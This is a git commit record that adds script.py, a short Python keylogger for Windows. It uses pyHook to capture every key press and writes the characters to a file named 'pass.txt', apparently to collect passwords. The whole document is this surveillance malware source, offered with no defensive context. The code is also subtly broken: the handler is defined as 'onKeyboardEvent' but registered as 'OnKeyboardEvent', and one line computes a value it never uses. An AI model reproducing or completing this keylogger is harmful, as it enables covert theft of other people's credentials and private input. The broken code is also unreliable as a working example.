8e8e551cb57b46a2a4025e78657a14bf02618e74
Aman Srivastav <hack.uean7@gmail.com>
2019-02-17 12:04:45 +0530

    Add files via upload

---
+++ script.py
@@ -0,0 +1,16 @@
+import pyHook
+import sys
+import logging
+import pythoncom
+
+file_log = 'b:\\pass.txt'
+
+def onKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
